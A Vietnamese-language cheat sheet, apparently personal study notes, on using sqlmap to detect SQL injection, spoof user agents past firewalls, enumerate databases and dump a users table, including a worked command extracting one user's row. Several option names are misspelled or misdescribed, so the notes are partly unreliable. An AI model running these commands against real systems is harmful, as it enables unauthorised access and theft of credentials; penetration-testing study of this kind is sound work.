# Syntax
```Bash
sqlmap -u "http://example.com/?search=123" <options>
```
- **Các options**:
    - -p seatch : một số URL có nhiều tham số thì cần para này. Nếu không sqlmap sẽ quét hết
    - --batch : bỏ qua các câu hỏi mặc định của SQLMap
    - --curent-db : DB hiện tại
    - --banner : phiên bản SQL
    - --tables :tìm bảng (liệt kê các bảng, nếu không đi kèm DB thì sẽ liệt kê hết)
    > [!important] ⇒ Có thể xem columns từ đây

    - --columns : xem cột, nhưng cần dùng thêm --tables để xác định bảng; có thể là cả -D <tên DB>
    - -p <id> : chỉ định tim payload vào một id cụ thể
    - --user-agent : giả browser để bypass firewall, nhận respond khác từ server (do phía server), …
    - --random-agent
    - --is-dba : check user hiện tại có phải quyền cao nhất không
    - --dbm=mysql : chỉ định loại DB, bỏ qua bước quét
    - --force-sql : buộc SQLMap sử dụng https kể cả lúc nhập vào là http
    - --ignore-redirects : không tự động chuyển hướng khi gặp status code 3xx (SQLMap mặc định tự chuyển)
    
    > [!important] Nếu chưa có para phù hợp thì cần tìm bằng:
    
    - --forms : tự động dò tìm và khai thác các form HTML (có thể 1 số form cần cookie)
    - --crawl=5 : dò các URL liên kết bên trong web
    - --techniqu = U / B / E (Union, Blind, Error-based)
---
# Kiểm tra SLQi
## Cách 1:
```JavaScript
http://example.com/page.php?id=1
```
⇒ Nếu chèn **'** vào thành:
```JavaScript
http://example.com/page.php?id=1'
```
mà có lỗi SQL thì khả năng có SQLi.

## Cách 2:
```Bash
sqlmap -u "domain" --batch --data="search=123"
```
---
# Dump
> Trích xuất dữ liệu từ DB
Các bước tiến hành: --dbs ⇒ --table -D <DB> ⇒ --dump -T <bảng> -D <DB>
```Bash
sqlmap -u "http:example.com/?search=123" -p search -D dic -T users --dump --batch
```
---
# Một ví dụ thực tế:
```Bash
sqlmap -u "https://domain.com/?search=123" --batch --level=5 --risk=3 -D eclip_cars -T users --dump --where="username='Alice'"
```
Kinh nghiệm là nên dùng --level=5 và --risk=3 để tăng khả năng quét.
Khi quét đc DB để tìm tables, xác định tables cần rồi thì tìm columns (username, password, id, ...) rồi hẵn dump.